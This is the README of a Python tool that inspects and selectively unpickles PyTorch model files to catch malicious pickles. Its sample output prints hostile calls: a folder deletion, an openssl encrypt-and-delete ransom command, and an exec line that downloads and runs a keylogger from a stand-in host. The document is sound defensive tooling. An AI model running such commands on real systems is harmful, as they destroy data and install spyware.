# pickle_inspector 🥒🔬
Check what is in the pickle before eating it.

NOTE:
torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438
until this is fixed, stick to 1.12.x or older.

## Inspecting
Inspect without unpickling.
```py
import torch
import pickle_inspector
result = torch.load('sus.pt', pickle_module=pickle_inspector.inspector)
for c in result.classes:
    print(c)
```
notice calls to `shutil.rmtree`, `os.system` or similar
```
> shutil.rmtree
> torch._utils._rebuild_tensor_v2
> collections.OrderedDict
> numpy.core.multiarray.scalar
> os.system
> numpy.dtype
> _codecs.encode
```
so we are taking a closer look at what is being called
```py
for c in result.calls:
    print(c)
```
and it seems like someone tried to delete something and ransom a file
```
> shutil.rmtree(('/very/important/folder'), {})
> collections.OrderedDict((), {})
> torch._utils._rebuild_tensor_v2((None, 0, (1000,), (1,), False, collections.OrderedDict((), {})), {})
...
> torch._utils._rebuild_tensor_v2((None, 0, (), (), False, collections.OrderedDict((), {})), {})
> os.system(('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file'), {})
> numpy.dtype(('f8', False, True), {})
> numpy.dtype.__setstate__(((3, '<', None, None, None, -1, -1, 0),), {})
> _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})
> numpy.core.multiarray.scalar((numpy.dtype(('f8', False, True), {}), _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})), {})
```
## Controlled unpickling
Inspect and unpickle using white and blacklists.

```py
import torch
from pickle_inspector import UnpickleConfig, UnpickleControlled, PickleModule
config = UnpickleConfig()
# only allow  modules, classes and funcions in the whitelist
# the rest will be stubbed
config.whitelist = [
        'torch._utils._rebuild_tensor_v2',
        'torch.FloatStorage',
        'torch.IntStorage',
        'torch.LongStorage',
        'numpy.core.multiarray.scalar',
        'numpy.dtype',
        'collections.OrderedDict',
        '_codecs.encode'
]
result = torch.load('model.ckpt', pickle_module = PickleModule(UnpickleControlled, config))
state_dict = result.structure
for c in result.classes:
    print(c)
```
```
> torch._utils._rebuild_tensor_v2
> torch.FloatStorage
...
> STUBBED exec
> collections.OrderedDict
...
```
```py
for c in results.calls:
    if 'exec' in c:
        print(c)
```
```py
> exec('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
```
## Blacklist & Whitelist
The whitelist has priority over the blacklist.

If the blacklist contains items everything will be allowed except items in the blacklist,\
or items in the blacklist and in the whitelist. This is useful using wildcards.

Example: Block everything within `torch` except `torch.FloatStorage`
```py
conf.blacklist = ['torch.*']
conf.whitelist = ['torch.FloatStorage']
```

If the blacklist is empty and the whitelist contains items, \
everything except items in the whitelist will be blocked.

Tested with python 3.9 and torch 1.12.1
